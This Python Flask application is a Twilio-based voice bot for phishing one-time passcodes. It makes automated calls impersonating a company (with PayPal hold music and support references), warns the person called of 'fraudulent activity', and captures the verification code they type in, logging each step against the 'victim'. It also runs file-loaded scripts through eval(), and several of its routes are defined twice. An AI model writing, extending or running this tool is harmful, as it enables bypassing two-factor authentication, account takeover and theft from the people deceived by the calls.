from flask import Flask, request
from twilio.twiml.voice_response import VoiceResponse, Gather, Play

app = Flask(__name__)

@app.route("/voice", methods=['GET', 'POST'])
def voice():
    # Start a TwiML response
    resp = VoiceResponse()
    sid1 = request.values['CallSid']
    raw_queue = open('Extra/user_queue', 'r').readlines()
    print(raw_queue)
    status = ''
    for e in raw_queue:
        try:
            a = e.strip('\n').split(' - ')
            id = a[0]
            sid = a[2]
            print(sid, sid1)
            if sid1 == sid:
                status = 'yes'
        except:
            pass

    if status == 'yes':
        Company_Name = open(f'Extra/user_db_otp/{id}/Company Name.txt', 'r').read()
        Name = open(f'Extra/user_db_otp/{id}/Name.txt', 'r').read()
        resp.say(
            f"Automated Alert From {Company_Name}, Hello {Name}, your {Company_Name} account has detected fraudulent activity and need verification,")
        gather = Gather(num_digits=1, action='/gather', timeout=17)
        gather.say('Please dial any number to continue this call,')
        resp.append(gather)
        open(f'Extra/user_db_otp/{id}/status.txt', 'w').write('Waiting For Victim Interactions')
        return str(resp)
    else:
        resp.say('Nothing!')
        return str(resp)



@app.route('/gather', methods=['GET', 'POST'])
def gather():
    """Processes results from the <Gather> prompt in /voice"""
    # Start TwiML response
    resp = VoiceResponse()
    phone = request.values['Called']
    raw_queue = open('Extra/user_queue', 'r').readlines()
    status = ''
    for e in raw_queue:
        a = e.strip('\n').split(' - ')
        phone1 = a[1]
        id = a[0]
        if phone1 in phone:
            status = 'yes'

    if status == 'yes':
        if 'Digits' in request.values:
            choice = request.values['Digits']
            Digits = open(f'Extra/user_db_otp/{id}/Digits.txt', 'r').read()
            open(f'Extra/user_db_otp/{id}/status.txt', 'w').write('Sending OTP')
            gatherotp = Gather(num_digits=int(Digits), action='/gatherotp', timeout=300)
            gatherotp.say(
                f'To verify ownership, please enter the {Digits} digits code we have sent to your mobile device,')
            resp.append(gatherotp)
            return str(resp)
        else:
            resp.redirect('/voice')
            return str(resp)
    else:
        resp.say('Nothing!')
        return str(resp)

@app.route('/gatherotp', methods=['GET', 'POST'])
def gatherotp():
    """Processes results from the <Gather> prompt in /voice"""
    resp = VoiceResponse()
    phone = request.values['Called']
    raw_queue = open('Extra/user_queue', 'r').readlines()
    status = ''
    for e in raw_queue:
        a = e.strip('\n').split(' - ')
        phone1 = a[1]
        id = a[0]
        if phone1 in phone:
            status = 'yes'

    if status == 'yes':
        resp.say('Thank you, Please give us a moment, while we connect you to one of our live support agents,')
        if 'Digits' in request.values:
            open(f'Extra/user_db_otp/{id}/status.txt', 'w').write('OTP Gathered')
            open(f'Extra/user_db_otp/{id}/otp.txt', 'w', encoding='utf-8').write(request.values['Digits'])
            resp.play(url='https://ia601504.us.archive.org/7/items/paypal-music-on-hold_00oOGMFY/paypal-music-on-hold_00oOGMFY.mp3')
            resp.say(
                'It seems like the support are too busy at the moment, If you accidently typed in the wrong verification code, We will call you again, To get some help you can refer to www.paypal.com/support')
            return str(resp)

        else:
            open(f'Extra/user_db_otp/{id}/status.txt', 'w').write('No Otp. Redirect Victim To Redial Otp')
            resp.say("Sorry, Please Dial Your Code")
            resp.redirect('/gather')
            return str(resp)
    else:
        resp.say(f"Nothing!")
        return str(resp)

@app.route("/voice", methods=['GET', 'POST'])
def voicecustom():
    # Start a TwiML response
    resp = VoiceResponse()
    sid1 = request.values['CallSid']
    raw_queue = open('Extra/user_queue', 'r').readlines()
    print(raw_queue)
    status = ''
    for e in raw_queue:
        try:
            a = e.strip('\n').split(' - ')
            id = a[0]
            sid = a[2]
            type_ = a[4]
            module = a[3]
            print(sid, sid1)
            if sid1 == sid:
                status = 'yes'
        except:
            pass

    if status == 'yes':
        Company_Name = open(f'Extra/user_db_otp/{id}/Company Name.txt', 'r').read()
        Name = open(f'Extra/user_db_otp/{id}/Name.txt', 'r').read()
        try:
            fstring_from_file = open(f'script/private/{id}/{type_} otp/{module}', 'r').read().split(' - ')[0]
            compiled_fstring = compile(fstring_from_file, '<fstring_from_file>', 'eval')
            formatted_output = eval(compiled_fstring)
        except:
            resp.say('nothing much')
            open(f'Extra/user_db_otp/{id}/status.txt', 'w').write('Some Errors')
            return str(resp)
        resp.say(formatted_output)
        try:
            fstring_from_file = open(f'script/private/{id}/{type_} otp/{module}', 'r').read().split(' - ')[1]
            compiled_fstring = compile(fstring_from_file, '<fstring_from_file>', 'eval')
            formatted_output = eval(compiled_fstring)
        except:
            resp.say('nothing much')
            open(f'Extra/user_db_otp/{id}/status.txt', 'w').write('Some Errors')
            return str(resp)
        gather = Gather(num_digits=1, action='/gather', timeout=17)
        gather.say(formatted_output)
        resp.append(gather)
        open(f'Extra/user_db_otp/{id}/status.txt', 'w').write('Waiting For Victim Interactions')
        return str(resp)
    else:
        resp.say('Nothing!')
        return str(resp)



@app.route('/gather', methods=['GET', 'POST'])
def gathercustom():
    """Processes results from the <Gather> prompt in /voice"""
    # Start TwiML response
    resp = VoiceResponse()
    phone = request.values['Called']
    raw_queue = open('Extra/user_queue', 'r').readlines()
    status = ''
    for e in raw_queue:
        a = e.strip('\n').split(' - ')
        phone1 = a[1]
        id = a[0]
        type_ = a[4]
        module = a[3]
        if phone1 in phone:
            status = 'yes'

    if status == 'yes':
        if 'Digits' in request.values:
            choice = request.values['Digits']
            Digits = open(f'script/private/{id}/{type_} otp/module.txt', 'r').read().split(' : ')[-1]
            if type_ == '2':
                Digits = Digits.split(' - ')[0]

            open(f'Extra/user_db_otp/{id}/status.txt', 'w').write('Sending OTP')
            gatherotp = Gather(num_digits=int(Digits), action='/gatherotpcustom', timeout=300)
            try:
                fstring_from_file = open(f'script/private/{id}/{type_} otp/{module}', 'r').read().split(' - ')[2]
                compiled_fstring = compile(fstring_from_file, '<fstring_from_file>', 'eval')
                formatted_output = eval(compiled_fstring)
            except:
                resp.say('nothing much')
                open(f'Extra/user_db_otp/{id}/status.txt', 'w').write('Some Errors')
                return str(resp)
            gatherotp.say(formatted_output)
            resp.append(gatherotp)
            return str(resp)
        else:
            resp.redirect('/voice')
            return str(resp)
    else:
        resp.say('Nothing!')
        return str(resp)

@app.route('/gatherotp', methods=['GET', 'POST'])
def gatherotpcustom():
    """Processes results from the <Gather> prompt in /voice"""
    resp = VoiceResponse()
    phone = request.values['Called']
    raw_queue = open('Extra/user_queue', 'r').readlines()
    status = ''
    for e in raw_queue:
        a = e.strip('\n').split(' - ')
        phone1 = a[1]
        id = a[0]
        type_ = a[4]
        module = a[3]
        if phone1 in phone:
            status = 'yes'

    if status == 'yes':
        try:
            fstring_from_file = open(f'script/private/{id}/{type_} otp/{module}', 'r').read().split(' - ')[3]
            compiled_fstring = compile(fstring_from_file, '<fstring_from_file>', 'eval')
            formatted_output = eval(compiled_fstring)
        except:
            resp.say('nothing much')
            open(f'Extra/user_db_otp/{id}/status.txt', 'w').write('Some Errors')
            return str(resp)

        if type_ == '2':
            Digits = open(f'script/private/{id}/{type_} otp/module.txt', 'r').read().split(' : ')[-1]
            if type_ == '2':
                Digits = Digits.split(' - ')[-1]
            gatherotp1 = Gather(num_digits=int(Digits), action='/gatherotpcustom2', timeout=300)
            gatherotp1.say(formatted_output)
            resp.append(gatherotp1)
        else:
            resp.say(formatted_output)

        if 'Digits' in request.values:
            open(f'Extra/user_db_otp/{id}/status.txt', 'w').write('OTP Gathered')
            open(f'Extra/user_db_otp/{id}/otp.txt', 'w', encoding='utf-8').write(request.values['Digits'])
            return str(resp)
        else:
            open(f'Extra/user_db_otp/{id}/status.txt', 'w').write('No Otp. Redirect Victim To Redial Otp')
            resp.say("Sorry, Please Dial Your Code")
            resp.redirect('/gather')
            return str(resp)
    else:
        resp.say(f"Nothing!")
        return str(resp)

@app.route('/gatherotp', methods=['GET', 'POST'])
def gatherotpcustom2():
    """Processes results from the <Gather> prompt in /voice"""
    resp = VoiceResponse()
    phone = request.values['Called']
    raw_queue = open('Extra/user_queue', 'r').readlines()
    status = ''
    for e in raw_queue:
        a = e.strip('\n').split(' - ')
        phone1 = a[1]
        id = a[0]
        type_ = a[4]
        module = a[3]
        if phone1 in phone:
            status = 'yes'

    if status == 'yes':
        try:
            fstring_from_file = open(f'script/private/{id}/{type_} otp/{module}', 'r').read().split(' - ')[3]
            compiled_fstring = compile(fstring_from_file, '<fstring_from_file>', 'eval')
            formatted_output = eval(compiled_fstring)
        except:
            resp.say('nothing much')
            open(f'Extra/user_db_otp/{id}/status.txt', 'w').write('Some Errors')
            return str(resp)

        if 'Digits' in request.values:
            resp.say(formatted_output)
            open(f'Extra/user_db_otp/{id}/status.txt', 'w').write('OTP Gathered')
            open(f'Extra/user_db_otp/{id}/otp1.txt', 'w', encoding='utf-8').write(request.values['Digits'])
            return str(resp)
        else:
            open(f'Extra/user_db_otp/{id}/status.txt', 'w').write('No Otp. Redirect Victim To Redial Otp')
            resp.say("Sorry, Please Dial Your Code")
            resp.redirect('/gather')
            return str(resp)
    else:
        resp.say(f"Nothing!")
        return str(resp)

@app.route("/voiceagain", methods=['GET', 'POST'])
def voiceagain():
    # Start a TwiML response
    resp = VoiceResponse()
    phone = request.values['Called']
    raw_queue = open('Extra/user_queue', 'r').readlines()
    status = ''
    for e in raw_queue:
        a = e.strip('\n').split(' - ')
        phone1 = a[1]
        id = a[0]
        if phone1 in phone:
            status = 'yes'

    if status == 'yes':
        Company_Name_ = open(f'Extra/user_db_otp/{id}/Company Name.txt', 'r')
        Company_Name = Company_Name_.read()
        Company_Name_.close()
        del Company_Name_
        Name_ = open(f'Extra/user_db_otp/{id}/Name.txt', 'r')
        Name = Name_.read()
        Name_.close()
        del Name_
        resp.say(f"Automated Alert From {Company_Name},Hello {Name}, it seems like you accidently type wrong code,")
        gather = Gather(num_digits=1, action='/gather', timeout=300)
        gather.say('To enter the verification code again, Press 1,')
        resp.append(gather)
        open(f'Extra/user_db_otp/{id}/status.txt', 'w').write('Waiting for victim...')
        open(f'Extra/user_queue1', 'a').write(f'{id}\n')
        return str(resp)
    else:
        resp.say(f"Nothing!")
        return str(resp)

@app.route("/status_fallback", methods=['GET', 'POST'])
def status_fallback():
    sid = request.values['CallSid']
    recording = request.values['RecordingUrl']
    callsid = request.values['RecordingSid']
    raw_queue = open('Extra/user_queue', 'r').readlines()
    open('Extra/user_queue', 'w').close()
    for e in raw_queue:
        a = e.strip('\n').split(' - ')
        id = a[0]
        sid1 = a[2]
        if not sid == sid1:
            open('Extra/user_queue', 'a').write(e)
        else:
            open(f'Extra/user_db_otp/{id}/recording.txt', 'w').write(f'{recording} - {callsid}')
            open('Extra/user_queue', 'a').write(e)

    return ''

if __name__ == "__main__":
    app.run(debug=True, port=1002)